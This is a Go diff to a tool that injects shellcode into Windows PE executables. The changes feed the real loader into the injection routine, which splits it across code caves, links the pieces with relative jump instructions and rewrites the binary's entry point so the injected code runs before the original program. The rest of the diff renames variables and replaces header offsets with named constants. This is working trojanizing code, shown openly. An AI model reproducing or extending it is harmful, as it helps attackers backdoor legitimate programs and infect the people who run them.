@@ -128,17 +128,12 @@ func (inj *Injector) Inject(shellcode, image []byte, opts *Options) ([]byte, err
 	if err != nil {
 		return nil, fmt.Errorf("failed to build loader: %s", err)
 	}
-	fmt.Println(len(loader))
 	// make duplicate for make output image
 	dup := make([]byte, len(image))
 	copy(dup, image)
 	inj.dup = dup
 	// inject loader segment
-	sc := [][]byte{
-		{0x90},
-		{0x66, 0x90},
-	}
-	err = inj.inject(sc)
+	err = inj.inject(loader)
 	if err != nil {
 		return nil, fmt.Errorf("failed to inject loader: %s", err)
 	}
@@ -206,7 +201,7 @@ func (inj *Injector) inject(loader [][]byte) error {
 		first = inj.caves[i]
 		inj.removeCodeCave(i)
 	}
-	target := first
+	current := first
 	next := inj.selectCodeCave()
 	for i := 0; i < len(loader); i++ {
 		size := len(loader[i])
@@ -215,24 +210,24 @@ func (inj *Injector) inject(loader [][]byte) error {
 		}
 		var rel int64
 		if i != len(loader)-1 {
-			rel = int64(next.virtualAddr) - int64(target.virtualAddr+uint32(size)) - 5
+			rel = int64(next.virtualAddr) - int64(current.virtualAddr+uint32(size)) - 5
 		} else {
-			rel = int64(entryPoint) - int64(target.virtualAddr+uint32(size)) - 5
+			rel = int64(entryPoint) - int64(current.virtualAddr+uint32(size)) - 5
 		}
 		jmp := make([]byte, 5)
 		jmp[0] = 0xE9
 		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
 		inst := append([]byte{}, loader[i]...)
 		inst = append(inst, jmp...)
-		copy(inj.dup[target.pointerToRaw:], inst)
+		copy(inj.dup[current.pointerToRaw:], inst)
 		// update status
-		target = next
+		current = next
 		next = inj.selectCodeCave()
 	}
 	// overwrite original entry point
-	peOffset := binary.LittleEndian.Uint32(inj.dup[64-4:])
-	hdrOffset := peOffset + 4 + 20
-	binary.LittleEndian.PutUint32(inj.dup[hdrOffset+16:], first.virtualAddr)
+	peOffset := binary.LittleEndian.Uint32(inj.dup[imageDOSHeader-4:])
+	hdrOffset := peOffset + 4 + imageFileHeaderSize
+	binary.LittleEndian.PutUint32(inj.dup[hdrOffset+offsetToEntryPoint:], first.virtualAddr)
 	return nil
 }
 
